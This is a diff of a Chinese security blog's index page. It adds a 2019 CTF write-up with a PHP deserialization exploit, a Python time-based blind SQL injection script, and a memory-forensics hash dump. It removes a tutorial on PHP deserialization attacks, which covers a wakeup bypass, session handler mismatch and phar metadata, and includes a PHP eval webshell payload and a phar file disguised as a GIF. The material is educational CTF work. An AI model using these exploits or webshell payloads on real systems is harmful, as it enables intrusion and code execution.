@@ -90,6 +90,174 @@
     
         <article class="post">
             <h1>
+                <a class="title" href="/2019/01/26/安恒杯月赛19新年场WriteUp/"> 
+                    安恒杯月赛19新年场WriteUp 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-01-26   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="安恒杯月赛19新年场WriteUp"><a href="#安恒杯月赛19新年场WriteUp" class="headerlink" title="安恒杯月赛19新年场WriteUp"></a>安恒杯月赛19新年场WriteUp</h1><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h2><p>题目代码</p>
+<pre><code>&lt;?php  
+@error_reporting(1); 
+include &#39;flag.php&#39;;
+class baby 
+{   
+    protected $skyobj;  
+    public $aaa;
+    public $bbb;
+    function __construct() 
+    {      
+        $this-&gt;skyobj = new sec;
+    }  
+    function __toString()      
+    {          
+        if (isset($this-&gt;skyobj))  
+            return $this-&gt;skyobj-&gt;read();      
+    }  
+}  
+
+class cool 
+{    
+    public $filename;     
+    public $nice;
+    public $amzing; 
+    function read()      
+    {   
+        $this-&gt;nice = unserialize($this-&gt;amzing);
+        $this-&gt;nice-&gt;aaa = $sth;
+        if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)
+        {
+            $file = &quot;./{$this-&gt;filename}&quot;;        
+            if (file_get_contents($file))         
+            {              
+                return file_get_contents($file); 
+            }  
+            else 
+            { 
+                return &quot;you must be joking!&quot;; 
+            }    
+        }
+    }  
+}  
+
+class sec 
+{  
+    function read()     
+    {          
+        return &quot;it&#39;s so sec~~&quot;;      
+    }  
+}  
+
+if (isset($_GET[&#39;data&#39;]))  
+{ 
+    $Input_data = unserialize($_GET[&#39;data&#39;]);
+    echo $Input_data; 
+} 
+else 
+{ 
+    highlight_file(&quot;./index.php&quot;); 
+} 
+?&gt;</code></pre><h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><p>考点一：echo可以调用toString()函数用来返回flag.php内容</p>
+<p>考点二：让$this-&gt;nice是一个非baby的类，就能绕过$str</p>
+<p>考点三：unserialize()不会执行<strong>construct，外部不可控protected变量skyobj，但是序列化时可以放到</strong>construct内部控制</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code>class baby 
+{   
+    protected $skyobj;  
+    function __construct() 
+    {      
+    $this-&gt;skyobj = new cool;
+    $this-&gt;skyobj-&gt;amzing = serialize(new sec);
+    $this-&gt;skyobj-&gt;filename = &quot;flag.php&quot;;
+    }  
+
+}
+
+class sec 
+{
+    function read(){}
+}
+
+class cool 
+{ 
+    public $filename;     
+    public $nice;
+    public $amzing; 
+}
+
+
+$test = new baby();
+echo urlencode(serialize($test));</code></pre><h2 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h2><p>约束攻击登陆admin</p>
+<p>登陆后盲注</p>
+<p>EXP</p>
+<pre><code>#!/usr/bin/env python
+# encoding: utf-8
+
+import requests
+import time
+
+
+def login(payload):
+    url = &quot;http://106.12.21.77/Admin/User/Index?search[table]=flag/**/where/**/1/**/and/**/%s&quot; % (payload)
+    # print &quot;[+] %s&quot; % (url)
+    before_time = time.time()
+    cookies = {&#39;PHPSESSID&#39;: &#39;3kus5jrhoqav8te0kf74hglii7&#39;}
+    response = requests.get(url, cookies=cookies)
+    # content = response.content
+    after_time = time.time()
+    offset = after_time - before_time
+    # print &quot;[*] Offset : %f&quot; % (offset)
+    if offset &gt; 2.5:
+        return True
+    else:
+        return False
+
+def main():
+    data = &quot;&quot;
+    charaters = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;
+    for i in range(1, 40, 1):
+        for j in charaters:
+            payload = &quot;if((mid((select/**/flag/**/from/**/flag),%d,1))=&#39;%s&#39;,sleep(3),0)%%23&quot; % (i, j)
+            if login(payload):
+                data += str(j)
+                print &quot;[+] Found : %s&quot; % (data)
+                break
+
+
+if __name__ == &quot;__main__&quot;:
+    main()</code></pre><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><pre><code>binwalk -e zhu.jpg</code></pre><p>Stegsolve</p>
+<h2 id="MISC2"><a href="#MISC2" class="headerlink" title="MISC2"></a>MISC2</h2><h3 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h3><p>volatility一把梭</p>
+<pre><code>volatility imageinfo -f memory #分析操作系统
+volatility hashdump -f memory --profile=WinXPSP2x86 #查看当前操作系统中的 password hash</code></pre><p><img src="https://i.loli.net/2019/01/26/5c4c0c216b399.jpg" alt></p>
+<p>得到管理员hash如下：</p>
+<pre><code>Administrator:500:0182bd0bd4444bf867cd839bf040d93b:c22b315c040ae6e0efee3518d830362b:::</code></pre><p>所以<code>c22b315c040ae6e0efee3518d830362b</code>即为管理员密码的md5值，解出来是123456789，再md5一下就行。</p>
+<h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p>内存取证工具 volatility 使用说明：<a href="https://www.restran.net/2017/08/10/memory-forensics-tool-volatility/" target="_blank" rel="noopener">https://www.restran.net/2017/08/10/memory-forensics-tool-volatility/</a></p>
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="键盘密码"><a href="#键盘密码" class="headerlink" title="键盘密码"></a>键盘密码</h2><p>ypau -&gt; flag</p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2019/01/26/安恒杯月赛19新年场WriteUp/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
                 <a class="title" href="/2019/01/20/ThinkPHP5.0.0~5.0.23RCE漏洞分析/"> 
                     ThinkPHP5.0.0~5.0.23RCE漏洞分析 
                 </a>
@@ -1299,281 +1467,6 @@ cookie传入参数login_data解析查库，用了json_decode，那么就可以�
             </div>
             <div class="continue">
             <a href="/2018/10/22/ISCC2018 信阳杯线下赛小结/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2018/09/13/四个实例递进php反序列化/"> 
-                    四个实例递进php反序列化 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2018-09-13   
-                </a>
-                
-                
-                
-                    
-            </div>
-            <div class="content">
-                
-                <p>##声明<br>文章首发于安全客：<a href="https://www.anquanke.com/post/id/159206" target="_blank" rel="noopener">https://www.anquanke.com/post/id/159206</a></p>
-<h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>最近在总结php序列化相关的知识，看了好多前辈师傅的文章，决定对四个理解难度递进的序列化思路进行一个复现剖析。包括最近Blackhat议题披露的phar拓展php反序列化漏洞攻击面。前人栽树，后人乘凉，担着前辈师傅们的辅拓前行！</p>
-<h2 id="D0g3"><a href="#D0g3" class="headerlink" title="D0g3"></a>D0g3</h2><p>为了让大家进入状态，来一道简单的反序列化小题，新来的表哥们可以先学习一下php序列化和反序列化。顺便安利一下D0g3小组的平台，后面会有题不断上新哦~<br>题目平台地址：<a href="http://ctf.d0g3.cn" target="_blank" rel="noopener">http://ctf.d0g3.cn</a><br>题目入口：<a href="http://120.79.33.253:9001" target="_blank" rel="noopener">http://120.79.33.253:9001</a></p>
-<p>页面给了源码</p>
-<pre><code>&lt;?php
-error_reporting(0);
-include &quot;flag.php&quot;;
-$KEY = &quot;D0g3!!!&quot;;
-$str = $_GET[&#39;str&#39;];
-if (unserialize($str) === &quot;$KEY&quot;)
-{
-    echo &quot;$flag&quot;;
-}
-show_source(__FILE__);</code></pre><p>提醒大家补充php序列化知识的水题~</p>
-<p>直接上传<code>s:7:&quot;D0g3!!!&quot;</code>即可get flag</p>
-<h2 id="绕过魔法函数的反序列化漏洞"><a href="#绕过魔法函数的反序列化漏洞" class="headerlink" title="绕过魔法函数的反序列化漏洞"></a>绕过魔法函数的反序列化漏洞</h2><p>漏洞编号CVE-2016-7124</p>
-<h3 id="魔法函数-sleep-和-wakeup"><a href="#魔法函数-sleep-和-wakeup" class="headerlink" title="魔法函数__sleep() 和 __wakeup()"></a>魔法函数__sleep() 和 __wakeup()</h3><p><strong>php文档中定义__wakeup():</strong></p>
-<p>unserialize() 执行时会检查是否存在一个 <strong>wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</strong>wakeup()经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。__sleep()则相反，是用在序列化一个对象时被调用</p>
-<p><img src="https://i.loli.net/2018/09/06/5b90f6d1d8152.png" alt></p>
-<h3 id="漏洞剖析"><a href="#漏洞剖析" class="headerlink" title="漏洞剖析"></a>漏洞剖析</h3><p>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10<br>PHP官方给了示例：<a href="https://bugs.php.net/bug.php?id=72663" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=72663</a><br>这个漏洞核心：<strong>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong>比如下面这个类构造：</p>
-<pre><code>class hpdoger{
-    public $a = &#39;nice to meet u&#39;;
-    }</code></pre><p>序列化这个类得到的结果：</p>
-<pre><code>O:7:&quot;hpdoger&quot;:1:{s:1:&quot;a&quot;;s:6:&quot;nice to meet u&quot;;}</code></pre><p>简单解释一下这个序列化字符串：<br>O代表结构类型为：类，7表示类名长度，接着是类名、属性（成员）个数<br>大括号内分别是：属性名类型、长度、名称；值类型、长度、值</p>
-<p>正常情况下，反序列化一个类得到的结果：<br><img src="https://i.loli.net/2018/09/06/5b90f7f9ae0d0.jpg" alt></p>
-<p>析构方法和__wakeup都能够执行</p>
-<p>如果我们把传入的序列化字符串的属性个数更改成大于1的任何数</p>
-<pre><code>O:7:&quot;hpdoger&quot;:2:{s:1:&quot;a&quot;;s:6:&quot;u know&quot;;}</code></pre><p>得到的结果如图，__wakeup没有被执行，但是执行了析构函数<br><img src="https://i.loli.net/2018/09/06/5b90f8ecc8319.png" alt></p>
-<p>假如我们的demo是这样的呢?</p>
-<pre><code>&lt;?php
-class A{
-    var $a = &quot;test&quot;;
-    function __destruct(){
-        $fp = fopen(&quot;D:\\phpStudy\\PHPTutorial\\WWW\\test\\shell.php&quot;,&quot;w&quot;);
-        fputs($fp,$this-&gt;a);
-        fclose($fp);
-    }
-    function __wakeup()
-        {
-            foreach(get_object_vars($this) as $k =&gt; $v) {
-                    $this-&gt;$k = null;
-            }
-        }
-}
-$hpdoger = $_POST[&#39;hpdoger&#39;];
-$clan = unserialize($hpdoger);
-?&gt;</code></pre><p>每次反序列化是都会调用__wakeup从而把$a值清空。但是，如果我们绕过wakeup不就能写Shell了？既然反序列化的内容是可控的，就利用上述的方法绕过wakeup。</p>
-<p>poc:</p>
-<pre><code>O:1:&quot;A&quot;:2:{s:1:&quot;a&quot;;s:27:&quot;&lt;?php eval($_POST[&quot;hp&quot;]);?&gt;&quot;;}</code></pre><h3 id="序列化漏洞常见的魔法函数"><a href="#序列化漏洞常见的魔法函数" class="headerlink" title="序列化漏洞常见的魔法函数"></a>序列化漏洞常见的魔法函数</h3><p>__construct():当一个类被创建时自动调用<br>__destruct():当一个类被销毁时自动调用<br>__invoke():当把一个类当作函数使用时自动调用<br>__tostring():当把一个类当作字符串使用时自动调用<br>__wakeup():当调用unserialize()函数时自动调用<br>__sleep():当调用serialize()函数时自动调用<br>__call():当要调用的方法不存在或权限不足时自动调用</p>
-<h2 id="Session反序列化漏洞"><a href="#Session反序列化漏洞" class="headerlink" title="Session反序列化漏洞"></a>Session反序列化漏洞</h2><h3 id="Session序列化机制"><a href="#Session序列化机制" class="headerlink" title="Session序列化机制"></a>Session序列化机制</h3><p>提到这个漏洞，就得先知道什么叫Session序列化机制。</p>
-<p>当session_start()被调用或者php.ini中session.auto_start为1时，PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录（默认为/tmp）。</p>
-<p>PHP处理器的三种序列化方式：<br>| 处理器         | 对应的存储格式    |<br>| —————— |:———————|<br>| php_binary      | 键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值 |<br>| php           | 键名＋竖线＋经过serialize()函数反序列处理的值   |<br>|php_serialize |serialize()函数反序列处理数组方式|</p>
-<p>配置文件php.ini中含有这几个与session存储配置相关的配置项：</p>
-<pre><code>session.save_path=&quot;&quot;   --设置session的存储路径,默认在/tmp
-session.auto_start   --指定会话模块是否在请求开始时启动一个会话,默认为0不启动
-session.serialize_handler   --定义用来序列化/反序列化的处理器名字。默认使用php</code></pre><p>一个简单的demo(session.php)认识一下存储过程：</p>
-<pre><code>&lt;?php
-ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);
-session_start();
-
-$_SESSION[&#39;hpdoger&#39;] = $_GET[&#39;hpdoger&#39;];
-
-?&gt;</code></pre><p>访问页面</p>
-<pre><code>http://localhost/test/session.php?hpdoger=lover</code></pre><p>在session.save_path对应路径下会生成一个文件，名称例如:sess_1ja9n59ssk975tff3r0b2sojd5<br>因为选择的序列化处理方式为php_serialize,所以是被serialize()函数处理过的$_SESSION[‘hpdoger’]。存储文件内容：</p>
-<pre><code>a:1:{s:7:&quot;hpdoger&quot;;s:5:&quot;lover&quot;;}</code></pre><p>如果选择的序列化处理方式为php，即<code>ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;);</code>,则存储内容为：</p>
-<pre><code>hpdoger|s:5:&quot;lover&quot;;</code></pre><h3 id="漏洞剖析-1"><a href="#漏洞剖析-1" class="headerlink" title="漏洞剖析"></a>漏洞剖析</h3><p>选择的处理方式不同，序列化和反序列化的方式亦不同。如果网站序列化并存储Session与反序列化并读取Session的方式不同，就可能导致漏洞的产生。</p>
-<p>这里提供一个demo：</p>
-<p>存储Session页面</p>
-<pre><code>/*session.php*/
-
-&lt;?php
-ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);
-session_start();
-
-$_SESSION[&#39;hpdoger&#39;] = $_GET[&#39;hpdoger&#39;];
-
-?&gt;</code></pre><p>可利用页面</p>
-<pre><code>/*test.php*/
-
-&lt;?php 
-ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;);
-session_start();
-
-class hpdoger{
-    var $a;
-
-    function __destruct(){
-        $fp = fopen(&quot;D:\\phpStudy\\PHPTutorial\\WWW\\test\\shell.php&quot;,&quot;w&quot;);
-        fputs($fp,$this-&gt;a);
-        fclose($fp);
-    }
-}
-
-?&gt;</code></pre><p>访问第一个页面的poc:<br><img src="https://i.loli.net/2018/09/06/5b90f6078e2c6.png" alt></p>
-<p>/tmp目录下生成的session文件内容：</p>
-<pre><code>a:1:{s:7:&quot;hpdoger&quot;;s:52:&quot;|O:7:&quot;hpdoger&quot;:1:{s:1:&quot;a&quot;;s:17:&quot;&lt;?php phpinfo()?&gt;&quot;;}&quot;;}</code></pre><p>再访问test.php时反序列化已存储的session，新的php处理方式会把“|”后的值当作KEY值再serialize()，相当于我们实例化了这个页面的hpdoger类，相当于执行:</p>
-<pre><code>$_SESSION[&#39;hpdoger&#39;] = new hpdoger();
-$_SESSION[&#39;hpdoger&#39;]-&gt;a = &#39;&lt;?php phpinfo()?&gt;&#39;;</code></pre><p>在指定的目录D:\phpStudy\PHPTutorial\WWW\test\shell.php中会写入内容<code>&lt;?php phpinfo()?&gt;</code><br><img src="https://i.loli.net/2018/09/06/5b90f607d6b3a.jpg" alt></p>
-<h3 id="jarvisoj-web的一道SESSION反序列化"><a href="#jarvisoj-web的一道SESSION反序列化" class="headerlink" title="jarvisoj-web的一道SESSION反序列化"></a>jarvisoj-web的一道SESSION反序列化</h3><p>题目入口(<a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/index.php</a>)<br>Index页给源码：</p>
-<pre><code>&lt;?php
-//A webshell is wait for you
-ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);
-session_start();
-class OowoO
-{
-    public $mdzz;
-    function __construct()
-    {
-        $this-&gt;mdzz = &#39;phpinfo();&#39;;
-    }
-
-    function __destruct()
-    {
-        eval($this-&gt;mdzz);
-    }
-}
-if(isset($_GET[&#39;phpinfo&#39;]))
-{
-    $m = new OowoO();
-}
-else
-{
-    highlight_string(file_get_contents(&#39;index.php&#39;));
-}
-?&gt;</code></pre><p>看到ini_set(‘session.serialize_handler’, ‘php’);</p>
-<p>暂时没找到用php_serialize添加session的方法。但看到当get传入phpinfo时会实例化OowoO这个类并访问phpinfo()<br><img src="https://i.loli.net/2018/09/07/5b927fb850e32.png" alt></p>
-<p>这里参考Chybeta师傅的一个姿势：session.upload_progress.enabled为On。session.upload_progress.enabled本身作用不大，是用来检测一个文件上传的进度。但当一个文件上传时，同时POST一个与php.ini中session.upload_progress.name同名的变量时（session.upload_progress.name的变量值默认为PHP_SESSION_UPLOAD_PROGRESS），PHP检测到这种同名请求会在$_SESSION中添加一条数据。我们由此来设置session。</p>
-<p>构造上传的表单poc，列出当前目录:</p>
-<pre><code>&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
-    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:26:&quot;print_r(scandir(__dir__));&quot;;}&quot; /&gt;
-    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
-    &lt;input type=&quot;submit&quot; /&gt;
-&lt;/form&gt;</code></pre><p>通过phpinfo页面查看当前路径<code>_SERVER[&quot;SCRIPT_FILENAME&quot;]</code><br><img src="https://i.loli.net/2018/09/07/5b927fb844eb0.png" alt></p>
-<p>读文件就行</p>
-<pre><code>|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:88:&quot;print_r(file_get_contents(/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php));&quot;;}</code></pre><p>得到flag</p>
-<pre><code>CTF{4d96e37f4be998c50aa586de4ada354a}</code></pre><h2 id="phar伪协议触发php反序列化"><a href="#phar伪协议触发php反序列化" class="headerlink" title="phar伪协议触发php反序列化"></a>phar伪协议触发php反序列化</h2><p>最近Black Hat比较热的一个议题：It’s a PHP unserialization vulnerability Jim, but not as we know it。参考了创宇的文章，这里笔者把它作为php反序列化的最后一个模块，希望日后能在以上的几种反序列化之外拓宽新的思路。</p>
-<h3 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar://协议"></a>phar://协议</h3><p>可以将多个文件归入一个本地文件夹，也可以包含一个文件</p>
-<h3 id="phar文件"><a href="#phar文件" class="headerlink" title="phar文件"></a>phar文件</h3><p>PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。所有PHAR文件都使用.phar作为文件扩展名，PHAR格式的归档需要使用自己写的PHP代码。</p>
-<h3 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h3><p>详情参考php手册(<a href="https://secure.php.net/phar" target="_blank" rel="noopener">https://secure.php.net/phar</a>)</p>
-<p>这里摘出创宇提供的四部分结构概要：<br>1、a stub<br>识别phar拓展的标识，格式:xxx<?php xxx; __HALT_COMPILER();?>。对应的函数Phar::setStub</p>
-<p>2、a manifest describing the contents<br>被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用的核心部分。对应函数Phar::setMetadata–设置phar归档元数据</p>
-<p>3、 the file contents<br>被压缩文件的内容。</p>
-<p>4、[optional] a signature for verifying Phar integrity (phar file format only)<br>签名，放在文件末尾。对应函数Phar :: stopBuffering –停止缓冲对Phar存档的写入请求，并将更改保存到磁盘</p>
-<h3 id="Phar内置方法"><a href="#Phar内置方法" class="headerlink" title="Phar内置方法"></a>Phar内置方法</h3><p>要想使用Phar类里的方法，必须将phar.readonly配置项配置为0或Off（文档中定义）</p>
-<p>PHP内置phar类，其他的一些方法如下：</p>
-<pre><code>$phar = new Phar(&#39;phar/hpdoger.phar&#39;); //实例一个phar对象供后续操作
-$phar-&gt;startBuffering()  //开始缓冲Phar写操作
-$phar-&gt;addFromString(&#39;test.php&#39;,&#39;&lt;?php echo \&#39;this is test file\&#39;;&#39;); //以字符串的形式添加一个文件到 phar 档案
-$phar-&gt;buildFromDirectory(&#39;fileTophar&#39;) //把一个目录下的文件归档到phar档案
-$phar-&gt;extractTo()  //解压一个phar包的函数，extractTo 提取phar文档内容</code></pre><h3 id="漏洞剖析-2"><a href="#漏洞剖析-2" class="headerlink" title="漏洞剖析"></a>漏洞剖析</h3><p>文件的第二部分a manifest describing the contents可知，phar文件会以序列化的形式存储用户自定义的meta-data，在一些<strong>文件操作函数</strong>执行的参数可控，参数部分我们利用Phar伪协议，可以不依赖unserialize()直接进行反序列化操作，在读取phar文件里的数据时反序列化meta-data，达到我们的操控目的。</p>
-<p>而在一些上传点，我们可以更改phar的文件头并且修改其后缀名绕过检测，如：test.gif，里面的meta-data却是我们提前写入的恶意代码，而且可利用的<strong>文件操作函数</strong>又很多，所以这是一种不错的绕过+执行的方法。</p>
-<h3 id="文件上传绕过deomo"><a href="#文件上传绕过deomo" class="headerlink" title="文件上传绕过deomo"></a>文件上传绕过deomo</h3><p>自己写了个丑陋的代码，只允许gif文件上传（实则有其他方法绕过，这里不赘述），代码部分如下</p>
-<p><strong>前端上传：</strong></p>
-<pre><code>&lt;form action=&quot;http://localhost/test/upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
-    &lt;input type=&quot;file&quot; name=&quot;hpdoger&quot;&gt;
-    &lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;
-&lt;/form&gt;</code></pre><p><strong>后端验证：</strong></p>
-<pre><code>/*upload.php*/
-&lt;?php
-    /*返回后缀名函数*/
-    function getExt($filename){
-        return substr($filename,strripos($filename,&#39;.&#39;)+1);
-    }
-
-    /*检测MIME类型是否为gif*/
-    if($_FILES[&#39;hpdoger&#39;][&#39;type&#39;] != &quot;image/gif&quot;){
-        echo &quot;Not allowed !&quot;;
-        exit;
-    }
-    else{
-        $filenameExt = strtolower(getExt($_FILES[&#39;hpdoger&#39;][&#39;name&#39;]));    /*提取后缀名*/
-
-        if($filenameExt != &#39;gif&#39;){
-            echo &quot;Not gif !&quot;;
-        }
-        else{
-            move_uploaded_file($_FILES[&#39;hpdoger&#39;][&#39;tmp_name&#39;], $_FILES[&#39;hpdoger&#39;][&#39;name&#39;]);
-            echo &quot;Successfully！&quot;;
-        }
-    }
-?&gt;</code></pre><p>代码判断了MIME类型+后缀判断，如下是我测试php文件的两个结果：<br>直接上传php<br><img src="https://i.loli.net/2018/09/07/5b9280161ed92.png" alt></p>
-<p>抓包更改content-type为 image/gif再次上传<br><img src="https://i.loli.net/2018/09/07/5b9280606915f.png" alt><br><img src="https://i.loli.net/2018/09/07/5b9280606784b.png" alt></p>
-<p>可以看到两次都被拒绝上传,那我们更改phar后缀名再次上传</p>
-<p>php环境编译生成一个phar文件，代码如下：</p>
-<pre><code>&lt;?php 
-class not_useful{
-    var $file = &quot;&lt;?php phpinfo() ?&gt;&quot;;
-}
-
-@unlink(&quot;hpdoger.phar&quot;);
-$test = new not_useful();
-$phar = new Phar(&quot;hpdoger.phar&quot;);
-
-$phar-&gt;startBuffering();
-$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); // 增加gif文件头
-$phar-&gt;setMetadata($test);
-$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);
-
-$phar-&gt;stopBuffering();
-?&gt;</code></pre><p>这里实例的类是为后面的demo做铺垫，php文件同目录下生成hpdoger.phar文件，我们更改名称为hpdoger.gif看一下<br><img src="https://i.loli.net/2018/09/07/5b92801620631.png" alt></p>
-<p>gif头、phar识别序列、序列化后的字符串都具备</p>
-<p>上传一下看能否成功,成功绕过检测在服务端存储一个hpdoger.gif<br><img src="https://i.loli.net/2018/09/07/5b92808e8c0bf.png" alt></p>
-<h3 id="利用Phar-伪协议demo"><a href="#利用Phar-伪协议demo" class="headerlink" title="利用Phar://伪协议demo"></a>利用Phar://伪协议demo</h3><p>我们已经上传了可解析的phar文件，现在需要找到一个文件操作函数的页面来利用，这里笔者写一个比较鸡肋的页面，目的是还原流程而非真实情况。</p>
-<p>代码如下:reapperance.php</p>
-<pre><code>&lt;?php
-    $recieve = $_GET[&#39;recieve&#39;];
-
-    /*写入文件类操作*/
-    class not_useful{
-        var $file;
-
-        function __destruct(){
-        $fp = fopen(&quot;D:\\phpStudy\\PHPTutorial\\WWW\\test\\shell.php&quot;,&quot;w&quot;); //自定义写入路径
-        fputs($fp,$this-&gt;file);
-        fclose($fp);
-    }
-
-    file_get_contents($recieve);
-
-?&gt;</code></pre><p>$recieve可控，符合我们的利用条件。那我们构造payload:<br><img src="https://i.loli.net/2018/09/07/5b92808e8a8ae.png" alt></p>
-<p>若执行成功，会将刚才写入meta-data数据里面序列化的类进行反序列化，并且实例了$file成员，导致文件写入，成功写入如下：<br><img src="https://i.loli.net/2018/09/07/5b92808e93634.png" alt></p>
-<h3 id="可利用的文件操作函数"><a href="#可利用的文件操作函数" class="headerlink" title="可利用的文件操作函数"></a>可利用的文件操作函数</h3><p>fileatime、filectime、file_exists、file_get_contents、file_put_contents、file、filegroup、fopen、fileinode、filemtime、fileowner、fileperms、is_dir、is_executable、is_file、is_link、is_readable、is_writable、is_writeable、parse_ini_file、copy、unlink、stat、readfile、md5_file、filesize</p>
-<h3 id="各种文件头"><a href="#各种文件头" class="headerlink" title="各种文件头"></a>各种文件头</h3><table>
-<thead>
-<tr>
-<th>类型</th>
-<th>标识</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>JPEG</td>
-<td>头标识ff d8 ,结束标识ff d9</td>
-</tr>
-<tr>
-<td>PNG</td>
-<td>头标识89 50 4E 47 0D 0A 1A 0A</td>
-</tr>
-<tr>
-<td>GIF</td>
-<td>头标识(6 bytes) 47 49 46 38 39(37) 61 GIF89(7)a</td>
-</tr>
-<tr>
-<td>BMP</td>
-<td>头标识(2 bytes) 42 4D BM</td>
-</tr>
-</tbody></table>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>jarvisoj-web-writeup(<a href="https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/#PHPINFO" target="_blank" rel="noopener">https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/#PHPINFO</a>)<br>利用 phar 拓展 php 反序列化漏洞攻击面(<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a>)</p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2018/09/13/四个实例递进php反序列化/">
             Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
